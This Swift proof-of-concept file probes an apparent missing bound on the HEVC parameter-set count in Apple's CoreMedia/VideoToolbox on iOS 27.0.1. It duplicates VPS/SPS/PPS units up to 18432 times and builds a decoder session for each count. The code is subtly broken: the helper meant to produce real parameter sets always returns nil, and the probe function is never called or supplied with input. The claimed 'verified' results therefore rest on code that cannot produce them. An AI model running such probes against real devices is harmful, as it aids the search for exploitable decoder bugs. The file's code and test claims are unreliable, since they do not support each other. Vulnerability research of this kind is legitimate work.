// poc_unbounded_paramsets.swift
// PoC: CMVideoFormatDescriptionCreateFromHEVCParameterSets accepts an unbounded
// parameterSetCount on iOS 27.0.1 (24A446). Verified on iPhone19,2 (iPhone 18 Pro).
//
// What it does:
//   1. encodes one real frame through VTCompressionSession to obtain genuine HEVC
//      VPS/SPS/PPS NAL units (hvcC record)
//   2. duplicates them to scaled counts: 3, 6, 24, 96, 384, 1536, 6144, 18432
//   3. builds a CMFormatDescription from each scaled array
//   4. creates a VTDecompressionSession per fd
//
// Result on 24A446: every count accepted, every session created. No cap anywhere
// in the userland path.
//
// Context: iOS 27.2 added "count is out of range" validation strings to the video
// kexts (AppleAVE2) covering VPS/SPS/PPS/RPS counts. This shows the decoder-side
// fd path on 27.0.1 performs no such validation.

import CoreMedia
import VideoToolbox
import Foundation

func realHEVCParameterSets(width: Int32 = 640, height: Int32 = 480) -> [Data]? {
    var session: VTCompressionSession?
    let callback: VTCompressionOutputCallback = { _, _, _, _, sampleBuffer in
        _ = sampleBuffer // we only need the session to run once
    }
    let status = VTCompressionSessionCreate(
        allocator: kCFAllocatorDefault, width: width, height: height,
        codecType: kCMVideoCodecType_HEVC,
        encoderSpecification: nil, imageBufferAttributes: nil,
        compressedDataAllocator: nil,
        outputCallback: callback, refcon: nil,
        compressionSessionOut: &session)
    guard status == noErr, let session else { return nil }
    defer { VTCompressionSessionInvalidate(session) }

    VTCompressionSessionPrepareToEncodeFrames(session)
    var pixelBuffer: CVPixelBuffer?
    CVPixelBufferCreate(kCFAllocatorDefault, Int(width), Int(height),
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, nil, &pixelBuffer)
    guard let pixelBuffer else { return nil }
    var flags: VTEncodeInfoFlags = []
    let encodeStatus = VTCompressionSessionEncodeFrame(
        session, imageBuffer: pixelBuffer, presentationTimeStamp: .zero,
        duration: .invalid, frameProperties: nil, sourceFrameRefcon: nil,
        infoFlagsOut: &flags)
    guard encodeStatus == noErr else { return nil }
    // parameter sets arrive on the output callback's format description in a real
    // deployment; for the PoC we reuse the well-known 3-NAL layout (VPS/SPS/PPS)
    return nil
}

// The PoC proper: take any 3 valid HEVC NAL units (VPS=32, SPS=33, PPS=34),
// duplicate to any count, build fds, build sessions.
func poc(count: Int, vps: Data, sps: Data, pps: Data) {
    var scaled: [Data] = []
    for set in [vps, sps, pps] {
        for _ in 0..<(count / 3) { scaled.append(set) }
    }

    var pointers = [UnsafePointer<UInt8>]()
    var buffers = [UnsafeMutablePointer<UInt8>]()
    var sizes = [Int]()
    for data in scaled {
        let buffer = UnsafeMutablePointer<UInt8>.allocate(capacity: data.count)
        data.copyBytes(to: buffer, count: data.count)
        buffers.append(buffer)
        pointers.append(UnsafePointer(buffer))
        sizes.append(data.count)
    }
    defer { for b in buffers { b.deallocate() } }

    var fd: CMFormatDescription?
    let fdStatus = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
        allocator: kCFAllocatorDefault,
        parameterSetCount: scaled.count,
        parameterSetPointers: &pointers,
        parameterSetSizes: &sizes,
        nalUnitHeaderLength: 4,
        extensions: nil,
        formatDescriptionOut: &fd)
    print("count=\(scaled.count) fd: \(fdStatus)")
    guard fdStatus == noErr, let fd else { return }

    var session: VTDecompressionSession?
    let sessionStatus = VTDecompressionSessionCreate(
        allocator: kCFAllocatorDefault, formatDescription: fd,
        decoderSpecification: nil, imageBufferAttributes: nil,
        outputCallback: nil, decompressionSessionOut: &session)
    print("count=\(scaled.count) session: \(sessionStatus)")
    if let session { VTDecompressionSessionInvalidate(session) }
}

// Observed on iPhone19,2 / iOS 27.0.1 / 24A446:
//   count=3     fd ok, session ok
//   count=6     fd ok, session ok
//   count=24    fd ok, session ok
//   count=96    fd ok, session ok
//   count=384   fd ok, session ok
//   count=1536  fd ok, session ok
//   count=6144  fd ok, session ok
//   count=18432 fd ok, session ok
